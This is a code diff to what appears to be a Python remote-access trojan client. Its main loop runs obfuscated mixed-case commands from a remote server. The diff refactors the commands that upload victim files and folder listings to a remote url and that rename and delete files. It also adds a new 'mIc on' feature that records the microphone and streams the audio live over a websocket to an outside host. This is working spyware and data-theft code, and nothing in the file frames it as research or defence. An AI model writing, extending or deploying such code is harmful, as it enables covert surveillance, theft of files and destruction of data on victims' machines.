@@ -15,9 +15,11 @@ from shutil import rmtree
 from shutil import which
 import tkinter as tk
 from mss import mss
+import numpy as np
 import websockets
 import builtins
 import pyttsx3
+import pyaudio
 import asyncio
 import psutil
 import pygame
@@ -39,11 +41,16 @@ screen = get_primary_display()
 terminate = False
 sstate = False
 sharing = False
+mic = False
 bstate = False
 bmstate = False
 bsig  = False
 user = "101"
 width, height = size()
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
+CHUNK = 1024
 
 #                  Initialisation of pygame 
 try:
@@ -538,10 +545,112 @@ def showerr(num:int) -> None:
         log(f"showerr Thread Error occured::\t{e}",state="WARN")
 
 ##                          Main Head                   ##
+def getFile(p):
+    if p.startswith("/"):
+        p = p.replace("/", "")
+    try:
+        with open(p, "rb") as file:
+            files = {'file': file}
+            print("file")
+            try:
+                res = post(url + "post-file", files=files)
+                if not res.status_code == 200:
+                    if not post(url + "post-file", files=files).status_code == 200:
+                        log("Can't Post the file dir",state="FATAL")
+            except Exception as e:
+                print("Error during file post:", e)
+    except Exception as e:
+        log(f"Error opening file {p}: {e}",state="WARN")
+
+def renameFile(a):
+    p, name = a.split("|")
+    if p.startswith("/"):
+        p = p.replace("/", "")
+    print(p)
+    print(name)
+    name = path.join(path.dirname(p), name)
+    try:
+        rename(p,name)
+    except Exception as e:
+        log(f"Error renameing:\t {e}",state="WARN")
+    print("rename")
+
+def deleteFile(p):
+    if p.startswith("/"):
+        p = p.replace("/", "")
+    try:
+        remove(p)
+    except Exception as e:
+        log(f"Error deleting:\t {e}",state="WARN")
+
+def getFolder(p):
+    try:
+        if p == "/":
+            folder = {}
+            partitions = psutil.disk_partitions()
+            for idx, partition in enumerate(partitions, start=1):
+                folder[f"folder{idx}"] = partition.device
+            if not post(url+"post-folder",json=folder).status_code == 200:
+                if not post(url+"post-folder",json=folder).status_code == 200:
+                    log("Cant post folder",state="FATAL")
+                
+        else:
+            if p.startswith("/"):
+                p = p.replace("/","")
+            datas = listdir(p)
+            folder = {}
+            for idx, data in enumerate(datas, start=1):
+                if path.isdir(path.join(p,data)):
+                    folder[f"folder{idx}"] = data
+                else:
+                    folder[f"file{idx}"] = data
+            if not post(url+"post-folder",json=folder).status_code == 200:
+                if not post(url+"post-folder",json=folder).status_code == 200:
+                    log("Cant Post Folder",state="FATAL")
+    except Exception as e:
+        log(f"GetFolder thread Error occured:\t{e}",state="WARN")
+
+def boost_volume(data, factor=1.05):
+    boosted = data * factor
+    return np.clip(boosted, -32768, 32767).astype(np.int16)
+
+async def send_audio():
+    audio = pyaudio.PyAudio()
+    stream = audio.open(format=FORMAT,
+                        channels=CHANNELS,
+                        rate=RATE,
+                        input=True,
+                        frames_per_buffer=CHUNK)
+
+    uri = "wss://screenshare-server.onrender.com"
+    async with websockets.connect(uri) as websocket:
+        print("Connected to WebSocket server for audio streaming.")
+        await websocket.send("audio")
+        try:
+            while mic:
+                data = stream.read(CHUNK, exception_on_overflow=False)
+                audio_data = np.frombuffer(data, dtype=np.int16)
+
+                boosted = boost_volume(audio_data)
+
+                await websocket.send(boosted.tobytes())
+
+                await asyncio.sleep(0.001)
+        except KeyboardInterrupt:
+            print("Streaming stopped.")
+        finally:
+            stream.stop_stream()
+            stream.close()
+            audio.terminate()
+
+def mic_trig():
+    asyncio.run(send_audio())
+
 
 def main():
     global sstate
     global sharing
+    global mic
     global bmstate
     global bsig
     log(f"{user} online!", state="ONLINE")
@@ -614,69 +723,22 @@ def main():
                 saying.start()
             elif "gEtFiLe" in cmd:
                 p = cmd.replace("gEtFiLe ", "")
-                if p.startswith("/"):
-                    p = p.replace("/", "")
-                try:
-                    with open(p, "rb") as file:
-                        files = {'file': file}
-                        print("file")
-                        try:
-                            res = post(url + "post-file", files=files)
-                            if not res.status_code == 200:
-                                if not post(url + "post-file", files=files).status_code == 200:
-                                    log("Can't Post the file dir",state="FATAL")
-                        except Exception as e:
-                            print("Error during file post:", e)
-                except Exception as e:
-                    log(f"Error opening file {p}: {e}",state="WARN")
+                Thread(target=getFile,args=(p,)).start()
             elif "rEnAmE" in cmd:
                 a = cmd.replace("rEnAmE ","")
-                p, name = a.split("|")
-                if p.startswith("/"):
-                    p = p.replace("/", "")
-                print(p)
-                print(name)
-                name = path.join(path.dirname(p), name)
-                try:
-                    rename(p,name)
-                except Exception as e:
-                    log(f"Error renameing:\t {e}",state="WARN")
-                print("rename")
+                Thread(target=renameFile,args=(a,)).start()
             elif "dElEtE" in cmd:
                 p = cmd.replace("dElEtE ","")
-                if p.startswith("/"):
-                    p = p.replace("/", "")
-                try:
-                    remove(p)
-                except Exception as e:
-                    log(f"Error deleting:\t {e}",state="WARN")
+                Thread(target=deleteFile,args=(p,)).start()
             elif "gEtFoLdEr" in  cmd:
-                try:
-                    p = cmd.replace("gEtFoLdEr ","")
-                    if p == "/":
-                        folder = {}
-                        partitions = psutil.disk_partitions()
-                        for idx, partition in enumerate(partitions, start=1):
-                            folder[f"folder{idx}"] = partition.device
-                        if not post(url+"post-folder",json=folder).status_code == 200:
-                            if not post(url+"post-folder",json=folder).status_code == 200:
-                                log("Cant post folder",state="FATAL")
-                            
-                    else:
-                        if p.startswith("/"):
-                            p = p.replace("/","")
-                        datas = listdir(p)
-                        folder = {}
-                        for idx, data in enumerate(datas, start=1):
-                            if path.isdir(path.join(p,data)):
-                                folder[f"folder{idx}"] = data
-                            else:
-                                folder[f"file{idx}"] = data
-                        if not post(url+"post-folder",json=folder).status_code == 200:
-                            if not post(url+"post-folder",json=folder).status_code == 200:
-                                log("Cant Post Folder",state="FATAL")
-                except Exception as e:
-                    log(f"GetFolder thread Error occured:\t{e}",state="WARN")
+                p = cmd.replace("gEtFoLdEr ","")
+                Thread(target=getFolder,args=(p,)).start()
+            elif "mIc on" in cmd:
+                mic = True
+                Thread(target=mic_trig).start()
+            elif "mIc off" in cmd:
+                mic = False
+                
         except Exception as e:
             log(f"Main thread error occured:\t{e}",state="WARN")
     log("Shutting down",state="OFFLINE")
